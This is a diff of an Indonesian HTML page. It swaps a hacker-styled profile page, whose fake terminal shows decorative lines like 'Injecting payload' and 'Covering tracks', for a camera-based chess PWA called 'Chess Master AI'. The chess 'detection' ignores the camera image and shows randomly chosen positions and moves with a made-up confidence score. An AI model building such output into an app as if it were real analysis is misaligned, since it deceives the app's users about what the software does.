-                    lineElement.className = 'terminal-line';
-                    lineElement.innerHTML = line;
-                    terminalBody.appendChild(lineElement);
-                    
-                    // Scroll ke bawah
-                    terminalBody.scrollTop = terminalBody.scrollHeight;
-                    
-                    // Tambah baris baru secara berkala
-                    if (index === terminalLines.length - 1) {
-                        setInterval(addTerminalLine, 3000);
-                    }
-                }, index * 500);
-            });
-        }
-        
-        function addTerminalLine() {
-            const terminalBody = document.getElementById('terminalBody');
-            const randomLines = [
-                "[root@system]# scanning network...",
-                "Found 5 vulnerable systems",
-                "Injecting payload to target #3",
-                "Bypassing security protocols...",
-                "Establishing persistent connection",
-                "Covering tracks...",
-                "Mission complete"
-            ];
-            
-            const lineElement = document.createElement('div');
-            lineElement.className = 'terminal-line';
-            lineElement.textContent = randomLines[Math.floor(Math.random() * randomLines.length)];
-            terminalBody.appendChild(lineElement);
-            
-            // Hapus baris lama jika terlalu banyak
-            if (terminalBody.children.length > 20) {
-                terminalBody.removeChild(terminalBody.firstChild);
-            }
-            
-            terminalBody.scrollTop = terminalBody.scrollHeight;
-        }
-        
-        function showTerminal() {
-            document.getElementById('terminalWrapper').style.display = 'block';
-            document.getElementById('terminalBody').scrollTop = document.getElementById('terminalBody').scrollHeight;
-        }
-        
-        function hideTerminal() {
-            document.getElementById('terminalWrapper').style.display = 'none';
-        }
-        
-        // Glitch Effect
-        function triggerGlitchEffect() {
-            const elements = document.querySelectorAll('.glitch');
-            elements.forEach(el => {
-                el.style.animation = 'none';
-                setTimeout(() => {
-                    el.style.animation = '';
-                }, 50);
-            });
-            
-            // Juga glitch foto profil
-            const photo = document.getElementById('profilePhoto');
-            photo.style.filter = 'sepia(100%) hue-rotate(180deg) contrast(150%)';
-            setTimeout(() => {
-                photo.style.filter = 'sepia(100%) hue-rotate(90deg) contrast(120%)';
-            }, 200);
-        }
-        
-        // Toggle Matrix Rain
-        function toggleMatrix() {
-            matrixActive = !matrixActive;
-            const matrixContainer = document.getElementById('matrixContainer');
-            
-            if (matrixActive) {
-                matrixContainer.style.display = 'block';
-                initMatrixRain();
+            let message = '';
+            if (isIOS) {
+                message = '📱 Cara menambahkan ke layar beranda:\n\n1. Ketuk ikon Bagikan (⬆️)\n2. Gulir ke bawah dan pilih "Tambahkan ke Layar Beranda"\n3. Ketuk "Tambahkan"';
+            } else if (isAndroid) {
+                message = '📱 Cara menambahkan ke layar beranda:\n\n1. Ketuk menu tiga titik (⋮) di browser\n2. Pilih "Tambahkan ke layar beranda"\n3. Ketuk "Tambahkan"';
             } else {
-                matrixContainer.style.display = 'none';
+                message = '📱 Cara menambahkan ke layar beranda:\n\nKlik menu browser (⋮ atau ⚙️) lalu pilih "Tambahkan ke layar beranda" atau "Install App"';
             }
+            
+            alert(message);
+        });
+        
+        // Set icon untuk shortcut (logo dengan foto/gambar catur)
+        function setAppIcon() {
+            // Buat canvas untuk icon
+            const iconCanvas = document.createElement('canvas');
+            iconCanvas.width = 192;
+            iconCanvas.height = 192;
+            const ctx = iconCanvas.getContext('2d');
+            
+            // Background gradient
+            const grad = ctx.createLinearGradient(0, 0, 192, 192);
+            grad.addColorStop(0, '#1a472a');
+            grad.addColorStop(1, '#2e5a3a');
+            ctx.fillStyle = grad;
+            ctx.fillRect(0, 0, 192, 192);
+            
+            // Lingkaran tengah
+            ctx.fillStyle = '#f39c12';
+            ctx.beginPath();
+            ctx.arc(96, 96, 70, 0, Math.PI * 2);
+            ctx.fill();
+            
+            // Gambar kuda catur
+            ctx.fillStyle = '#fff';
+            ctx.font = 'bold 85px "Segoe UI", "Apple Color Emoji"';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('♞', 96, 105);
+            
+            // Konversi ke data URL dan set sebagai icon
+            const iconUrl = iconCanvas.toDataURL();
+            
+            // Buat link icon untuk berbagai ukuran
+            const linkIcon192 = document.querySelector('link[rel="apple-touch-icon"]');
+            if (linkIcon192) {
+                linkIcon192.href = iconUrl;
+            }
+            
+            // Tambahkan icon untuk Android
+            let linkIcon = document.querySelector('link[rel="icon"]');
+            if (!linkIcon) {
+                linkIcon = document.createElement('link');
+                linkIcon.rel = 'icon';
+                document.head.appendChild(linkIcon);
+            }
+            linkIcon.href = iconUrl;
         }
         
-        // Update Device Info
-        function updateDeviceInfo() {
-            const deviceInfo = document.getElementById('deviceInfo');
-            const screenWidth = window.innerWidth;
-            const screenHeight = window.innerHeight;
-            
-            let info = `Screen: ${screenWidth}x${screenHeight} | `;
-            info += isMobile ? 'Mobile' : 'Desktop';
-            info += isTouchDevice ? ' | Touch' : ' | Mouse';
-            
-            deviceInfo.textContent = info;
-        }
+        // Panggil fungsi set icon
+        setAppIcon();
         
-        // Setup Event Listeners
-        function setupEventListeners() {
-            // Click/Touch pada foto profil
-            document.getElementById('profilePhoto').addEventListener('click', function() {
-                this.style.boxShadow = '0 0 40px #ff0000';
-                this.style.borderColor = '#ff0000';
-                setTimeout(() => {
-                    this.style.boxShadow = '0 0 20px #0f0, inset 0 0 20px rgba(0, 255, 0, 0.3)';
-                    this.style.borderColor = '#0f0';
-                }, 500);
-            });
-            
-            // Responsif terhadap resize
-            window.addEventListener('resize', function() {
-                initMatrixRain();
-                updateDeviceInfo();
-            });
-            
-            // Prevent context menu pada mobile
-            if (isMobile) {
-                document.addEventListener('contextmenu', function(e) {
-                    e.preventDefault();
+        // ============ FUNGSI KAMERA ============
+        
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' } 
                 });
+                video.srcObject = stream;
+                await video.play();
+                isCameraActive = true;
+                
+                startCameraBtn.disabled = true;
+                stopCameraBtn.disabled = false;
+                captureBtn.disabled = false;
+                
+                showMessage('Kamera aktif. Arahkan ke papan catur lalu tekan Deteksi', 'info');
+            } catch (err) {
+                console.error('Error accessing camera:', err);
+                showMessage('Tidak dapat mengakses kamera. Pastikan izin kamera diberikan.', 'error');
             }
         }
         
-        // Periodic glitch effect
-        setInterval(() => {
-            if (Math.random() > 0.7) {
-                triggerGlitchEffect();
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+                video.srcObject = null;
+                isCameraActive = false;
+                
+                startCameraBtn.disabled = false;
+                stopCameraBtn.disabled = true;
+                captureBtn.disabled = true;
+                
+                showMessage('Kamera dihentikan', 'info');
             }
-        }, 8000);
+        }
         
-        // Update countdown setiap detik
-        setInterval(() => {
-            if (countdownTime > 0) {
-                countdownTime--;
-                updateCountdownDisplay();
+        // Fungsi deteksi papan catur (simulasi AI)
+        async function detectChessBoard() {
+            if (!isCameraActive || !video.videoWidth) {
+                showMessage('Aktifkan kamera terlebih dahulu', 'error');
+                return;
             }
-        }, 1000);
+            
+            showMessage('Mendeteksi papan catur...', 'loading');
+            
+            // Set canvas size sesuai video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Simulasi pemrosesan AI
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Hasil deteksi simulasi dengan AI catur
+            const detectionResult = analyzeChessPosition();
+            
+            // Tampilkan hasil
+            displayResult(detectionResult);
+        }
+        
+        // Simulasi AI deteksi papan catur dan langkah terbaik
+        function analyzeChessPosition() {
+            // Simulasi posisi papan catur (format FEN sederhana)
+            const positions = [
+                {
+                    fen: 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1',
+                    bestMove: 'e2e4',
+                    moveDescription: 'Buka dengan pion raja (e4)',
+                    evaluation: '+0.30'
+                },
+                {
+                    fen: 'rnbqkbnr/pppppppp/8/8/4P3/8/PPPP1PPP/RNBQKBNR b KQkq - 0 1',
+                    bestMove: 'e7e5',
+                    moveDescription: 'Balas dengan e5',
+                    evaluation: '+0.25'
+                },
+                {
+                    fen: 'r1bqkbnr/pppp1ppp/2n5/4p3/4P3/5N2/PPPP1PPP/RNBQKB1R w KQkq - 0 3',
+                    bestMove: 'd2d4',
+                    moveDescription: 'Buka pusat dengan d4',
+                    evaluation: '+0.45'
+                }
+            ];
+            
+            // Pilih posisi acak untuk simulasi
+            const randomPos = positions[Math.floor(Math.random() * positions.length)];
+            
+            return {
+                ...randomPos,
+                timestamp: new Date().toLocaleTimeString(),
+                confidence: Math.floor(Math.random() * 20 + 75) // 75-95%
+            };
+        }
+        
+        function displayResult(result) {
+            const moveNotation = formatMoveNotation(result.bestMove);
+            
+            resultContent.innerHTML = `
+                <div class="board-state">
+                    <strong>📋 Posisi Papan (FEN):</strong><br>
+                    <code style="font-size: 11px; word-break: break-all;">${result.fen}</code>
+                    <br><br>
+                    <strong>🎯 Tingkat Keyakinan:</strong> ${result.confidence}%
+                    <br>
+                    <strong>⏱️ Waktu Deteksi:</strong> ${result.timestamp}
+                </div>
+                <div class="best-move">
+                    <h3>🏆 LANGKAH TERBAIK</h3>
+                    <div class="move-text">${moveNotation}</div>
+                    <p style="margin-top: 10px;">${result.moveDescription}</p>
+                    <p style="margin-top: 8px; font-size: 14px;">Evaluasi: ${result.evaluation}</p>
+                </div>
+                <div style="margin-top: 15px; padding: 12px; background: #f8f9fa; border-radius: 12px; text-align: center;">
+                    💡 <strong>Tips:</strong> Arahkan kamera ke papan catur dengan pencahayaan yang cukup untuk hasil terbaik
+                </div>
+            `;
+        }
+        
+        function formatMoveNotation(move) {
+            const pieceMap = {
+                'e2e4': '♙ e2 → e4',
+                'e7e5': '♟ e7 → e5',
+                'd2d4': '♙ d2 → d4',
+                'g1f3': '♞ g1 → f3',
+                'b8c6': '♞ b8 → c6'
+            };
+            return pieceMap[move] || move.toUpperCase();
+        }
+        
+        function showMessage(msg, type) {
+            resultContent.innerHTML = `
+                <div class="loading" style="color: ${type === 'error' ? '#e74c3c' : '#27ae60'}">
+                    ${type === 'loading' ? '⏳ ' : (type === 'error' ? '❌ ' : 'ℹ️ ')}${msg}
+                </div>
+            `;
+        }
+        
+        // Event listeners untuk kamera
+        startCameraBtn.addEventListener('click', startCamera);
+        stopCameraBtn.addEventListener('click', stopCamera);
+        captureBtn.addEventListener('click', detectChessBoard);
+        
+        // Cek dukungan service worker untuk PWA
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js').catch(err => {
+                console.log('Service worker registration failed:', err);
+            });
+        }
+        
+        // Menampilkan pesan selamat datang
+        console.log('Chess Master AI siap digunakan!');
+    </script>
+    
+    <script>
+        // Service Worker sederhana untuk PWA (inline)
+        if ('serviceWorker' in navigator) {
+            const swCode = `
+                const CACHE_NAME = 'chess-master-v1';
+                const urlsToCache = [
+                    '/',
+                    '/index.html'
+                ];
+                
+                self.addEventListener('install', event => {
+                    event.waitUntil(
+                        caches.open(CACHE_NAME)
+                            .then(cache => cache.addAll(urlsToCache))
+                    );
+                });
+                
+                self.addEventListener('fetch', event => {
+                    event.respondWith(
+                        caches.match(event.request)
+                            .then(response => response || fetch(event.request))
+                    );
+                });
+            `;
+            
+            const blob = new Blob([swCode], { type: 'application/javascript' });
+            const swUrl = URL.createObjectURL(blob);
+            
+            navigator.serviceWorker.register(swUrl).catch(err => {
+                console.log('SW registration failed');
+            });
+        }
     </script>
 </body>
 </html>
